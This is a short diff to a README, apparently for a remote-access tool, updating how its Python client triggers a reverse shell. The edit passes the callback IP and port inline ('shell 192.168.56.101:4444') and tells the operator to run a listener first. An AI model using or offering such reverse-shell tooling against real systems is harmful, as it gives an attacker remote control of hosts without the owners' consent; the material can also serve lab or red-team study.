@@ -58,9 +58,9 @@ python client.py "ipconfig"
 ```
 
 To initiate a reverse shell session, submit the special "shell" command:
-The reverse shell will be initated to the ip specify in the main.go source code you will need to replace it in your source code. The name of variable is listernerAddress. See the build section for more information
+Replace the ip after the shell with your call back ip the port can be changed too.
 ```bash
-python client.py "shell"
+python client.py "shell 192.168.56.101:4444"
 ```
 
 Ensure you have a listener running on the specified port before initiating the reverse shell:
